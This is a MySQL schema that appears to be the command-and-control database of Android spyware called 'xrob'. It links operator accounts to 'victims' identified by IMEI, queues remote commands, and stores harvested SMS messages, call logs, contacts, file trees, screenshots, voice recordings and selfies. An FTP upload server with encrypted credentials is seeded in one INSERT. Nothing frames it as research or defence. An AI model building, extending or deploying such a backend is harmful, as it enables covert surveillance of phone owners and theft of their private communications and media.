DROP DATABASE IF EXISTS `xrob`;
CREATE DATABASE IF NOT EXISTS `xrob` /*!40100 DEFAULT CHARACTER SET latin1 */;
USE `xrob`;

DROP TABLE IF EXISTS `clients`;
CREATE TABLE IF NOT EXISTS `clients` (
  `id`                INT(11)      NOT NULL AUTO_INCREMENT,
  `username`          VARCHAR(20)  NOT NULL,
  `pass_hash`         TEXT         NOT NULL,
  `api_key`           VARCHAR(10)  NOT NULL,
  `email`             VARCHAR(100) NOT NULL,
  `is_verified_email` TINYINT(4)   NOT NULL DEFAULT 0,
  `is_premium_client` TINYINT(4)   NOT NULL DEFAULT 0,
  `is_active`         TINYINT(4)   NOT NULL DEFAULT 1,
  `client_code`       VARCHAR(10)  NOT NULL,
  `last_logged_at`    TIMESTAMP    NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE KEY (username),
  UNIQUE KEY (email),
  UNIQUE KEY (api_key),
  UNIQUE KEY (client_code)
);

DROP TABLE IF EXISTS `victims`;
CREATE TABLE IF NOT EXISTS `victims` (
  `id`                  INT(11)     NOT NULL AUTO_INCREMENT,
  `victim_code`         VARCHAR(10) NOT NULL,
  `name`                VARCHAR(100),
  `email`               VARCHAR(150),
  `phone`               VARCHAR(20),
  `fcm_id`              TEXT,
  `fcm_updated_at`      TIMESTAMP   NULL,
  `api_key`             VARCHAR(10) NOT NULL,
  `imei`                VARCHAR(16) NOT NULL,
  `device_name`         VARCHAR(50) NOT NULL,
  `device_hash`         TEXT        NOT NULL,
  `device_info_static`  TEXT        NOT NULL,
  `device_info_dynamic` TEXT        NOT NULL,
  `actions`             VARCHAR(100)         DEFAULT NULL,
  `is_active`           TINYINT(4)  NOT NULL DEFAULT 1,
  `last_logged_at`      TIMESTAMP   NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `imei` (`imei`),
  UNIQUE KEY `api_key` (`api_key`)
);

DROP TABLE IF EXISTS `victim_device_info_dynamic_audit`;
CREATE TABLE IF NOT EXISTS `victim_device_info_dynamic_audit` (
  `id`                  INT(11)   NOT NULL AUTO_INCREMENT,
  `victim_id`           INT       NOT NULL,
  `device_info_dynamic` TEXT      NOT NULL,
  `last_logged_at`      TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  FOREIGN KEY (victim_id) REFERENCES victims (id)
    ON UPDATE CASCADE
    ON DELETE CASCADE
);

DROP TABLE IF EXISTS `client_victim_relations`;
CREATE TABLE IF NOT EXISTS `client_victim_relations` (
  `id`             INT(11)   NOT NULL AUTO_INCREMENT,
  `client_id`      INT       NOT NULL,
  `victim_id`      INT       NOT NULL,
  `last_logged_at` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  FOREIGN KEY (client_id) REFERENCES clients (id)
    ON UPDATE CASCADE
    ON DELETE CASCADE,
  FOREIGN KEY (victim_id) REFERENCES victims (id)
    ON UPDATE CASCADE
    ON DELETE CASCADE
);


DROP TABLE IF EXISTS `deliveries`;
CREATE TABLE IF NOT EXISTS `deliveries` (
  `id`                   INT(11) NOT NULL    AUTO_INCREMENT,
  `victim_id`            INT(11) NOT NULL,
  `data_type`            ENUM('messages', 'command_statuses', 'call_logs', 'contacts', 'files', 'media_screen_shot', 'media_voice', 'media_selfie', 'join', 're_join', 'file', 'other') NOT NULL,
  `error`                TINYINT(4) NOT NULL,
  `message`              TEXT NOT NULL,
  `server_error`         TINYINT(4) NOT NULL DEFAULT 0,
  `server_error_message` TEXT                DEFAULT NULL,
  `last_logged_at`       TIMESTAMP NOT NULL  DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);

DROP TABLE IF EXISTS `contacts`;
CREATE TABLE IF NOT EXISTS `contacts` (
  `id`                 INT(11)    NOT NULL AUTO_INCREMENT,
  `victim_id`          INT(11)    NOT NULL,
  `android_contact_id` INTEGER    NOT NULL,
  `name`               VARCHAR(100)        DEFAULT NULL,
  `is_active`          TINYINT(4) NOT NULL DEFAULT 1,
  `last_logged_at`     TIMESTAMP  NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);

DROP TABLE IF EXISTS `contact_names_audit`;
CREATE TABLE IF NOT EXISTS `contact_names_audit` (
  `id`             INT(11)      NOT NULL AUTO_INCREMENT,
  `contact_id`     INT(11)      NOT NULL,
  `name`           VARCHAR(100) NOT NULL,
  `last_logged_at` TIMESTAMP    NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  FOREIGN KEY (contact_id) REFERENCES contacts (id)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);


DROP TABLE IF EXISTS `phone_numbers`;
CREATE TABLE IF NOT EXISTS `phone_numbers` (
  `id`             INT(11)     NOT NULL AUTO_INCREMENT,
  `contact_id`     INT         NOT NULL,
  `phone`          VARCHAR(20) NOT NULL,
  `phone_type`     VARCHAR(20) NOT NULL,
  `last_logged_at` TIMESTAMP   NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  FOREIGN KEY (contact_id) REFERENCES contacts (id)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);


DROP TABLE IF EXISTS `commands`;
CREATE TABLE IF NOT EXISTS `commands` (
  `id`             INT(11)   NOT NULL AUTO_INCREMENT,
  `victim_id`      INT       NOT NULL,
  `client_id`      INT       NOT NULL,
  `command`        TEXT,
  `last_logged_at` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  FOREIGN KEY (client_id) REFERENCES clients (id)
    ON UPDATE CASCADE
    ON DELETE CASCADE,
  FOREIGN KEY (victim_id) REFERENCES victims (id)
    ON UPDATE CASCADE
    ON DELETE CASCADE
);

DROP TABLE IF EXISTS `command_statuses`;
CREATE TABLE IF NOT EXISTS `command_statuses` (
  `id`                 INT(11)                                                  NOT NULL AUTO_INCREMENT,
  `command_id`         INT                                                      NOT NULL,
  `status`             ENUM ('SENT', 'DELIVERED', 'INFO', 'FINISHED', 'FAILED') NOT NULL DEFAULT 'SENT',
  `status_message`     TEXT                                                     NOT NULL,
  `status_happened_at` VARCHAR(20)                                              NOT NULL,
  `last_logged_at`     TIMESTAMP                                                NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  FOREIGN KEY (command_id) REFERENCES commands (id)
    ON UPDATE CASCADE
    ON DELETE CASCADE
);

DROP TABLE IF EXISTS `file_bundles`;
CREATE TABLE IF NOT EXISTS `file_bundles` (
  `id`             INT(11)    NOT NULL AUTO_INCREMENT,
  `victim_id`      INT(11)    NOT NULL,
  `bundle_hash`    TEXT       NOT NULL,
  `is_active`      TINYINT(4) NOT NULL DEFAULT 1,
  `last_logged_at` TIMESTAMP  NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);

DROP TABLE IF EXISTS `files`;
CREATE TABLE IF NOT EXISTS `files` (
  `id`                   INT(11)    NOT NULL AUTO_INCREMENT,
  `file_bundle_id`       INT        NOT NULL,
  `absolute_parent_path` TEXT       NOT NULL,
  `file_name`            TEXT       NOT NULL,
  `parent_id`            INT,
  `is_directory`         TINYINT(4) NOT NULL,
  `file_size_in_kb`      INT(11)    NOT NULL,
  `file_hash`            TEXT       NOT NULL,
  `is_active`            TINYINT(4) NOT NULL DEFAULT 1,
  `last_logged_at`       TIMESTAMP  NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  FOREIGN KEY (`parent_id`) REFERENCES `files` (`id`)
    ON UPDATE CASCADE
    ON DELETE CASCADE,
  FOREIGN KEY (`file_bundle_id`) REFERENCES `file_bundles` (`id`)
    ON UPDATE CASCADE
    ON DELETE CASCADE
);


DROP TABLE IF EXISTS `calls`;
CREATE TABLE IF NOT EXISTS `calls` (
  `id`             INT(11)                       NOT NULL AUTO_INCREMENT,
  `victim_id`      INT(11)                       NOT NULL,
  `name`           VARCHAR(100)                           DEFAULT NULL,
  `phone`          VARCHAR(20)                   NOT NULL,
  `call_type`      ENUM(' IN ', 'OUT', 'MISSED') NOT NULL,
  `called_at`      TIMESTAMP                     NULL,
  `is_active`      TINYINT(4)                    NOT NULL DEFAULT 1,
  `last_logged_at` TIMESTAMP                     NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);

DROP TABLE IF EXISTS `ftp_servers`;
CREATE TABLE IF NOT EXISTS `ftp_servers` (
  `id`                  INT(11)     NOT NULL AUTO_INCREMENT,
  `name`                VARCHAR(10) NOT NULL,
  `ftp_domain_enc`      TEXT        NOT NULL,
  `ftp_username_enc`    TEXT        NOT NULL,
  `ftp_password_enc`    TEXT        NOT NULL,
  `storage_folder_path` VARCHAR(50) NOT NULL DEFAULT '/public_html',
  `size_in_mb`          INT(11)     NOT NULL,
  PRIMARY KEY (id)
);

INSERT INTO `ftp_servers` (name, ftp_domain_enc, ftp_username_enc, ftp_password_enc, size_in_mb) VALUES
  ('SERVER 1', 'U1kHyw0ABMAbfhg++WHYOaSJLrdi+Pht/EKPPJWGE8k=', 'mod6MfmVQKxTqzFLhxY3qQ==', 'cUmCHjmVHcz2i5Ucgqkp3Q==',
   1500);


DROP TABLE IF EXISTS `media`;
CREATE TABLE IF NOT EXISTS `media` (
  `id`              INT(11)                                       NOT NULL AUTO_INCREMENT,
  `victim_id`       INT(11)                                       NOT NULL,
  `name`            VARCHAR(100)                                  NOT NULL,
  `_type`           ENUM('SCREENSHOT', 'VOICE', 'SELFIE', 'FILE') NOT NULL,
  `ftp_server_id`   INT(11)                                       NOT NULL,
  `download_link`   TEXT                                          NOT NULL,
  `file_size_in_kb` INT(11)                                       NOT NULL,
  `captured_at`     TIMESTAMP                                     NULL,
  `is_active`       TINYINT(4)                                    NOT NULL DEFAULT 1,
  `last_logged_at`  TIMESTAMP                                     NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
    ON DELETE CASCADE
    ON UPDATE CASCADE,
  FOREIGN KEY (`ftp_server_id`) REFERENCES `ftp_servers` (`id`)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);

DROP TABLE IF EXISTS `messages`;
CREATE TABLE IF NOT EXISTS `messages` (
  `id`                 INT(11)                         NOT NULL AUTO_INCREMENT,
  `victim_id`          INT(11)                         NOT NULL,
  `android_message_id` INT(11)                         NOT NULL,
  `_from`              VARCHAR(50)                     NOT NULL,
  `content`            TEXT                            NOT NULL,
  `_type`              ENUM ('inbox', 'sent', 'draft') NOT NULL,
  `delivery_time`      BIGINT                          NOT NULL,
  `last_logged_at`     TIMESTAMP                       NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
    ON DELETE CASCADE
    ON UPDATE CASCADE
);


/* Change the delimiter so we can use ";" within the CREATE TRIGGER */
DELIMITER $$

CREATE TRIGGER after_contacts_update
AFTER UPDATE ON contacts
FOR EACH ROW BEGIN
  IF OLD.name <> NEW.name
  THEN
    INSERT INTO contact_names_audit
    SET contact_id = OLD.id,
      name         = OLD.name;
  END IF;
END$$

DELIMITER ;


DELIMITER $$

CREATE TRIGGER after_victim_update
AFTER UPDATE ON victims
FOR EACH ROW BEGIN
  IF OLD.device_info_dynamic <> NEW.device_info_dynamic
  THEN
    INSERT INTO victim_device_info_dynamic_audit
    SET victim_id         = OLD.id,
      device_info_dynamic = OLD.device_info_dynamic;
  END IF;
END$$

DELIMITER ;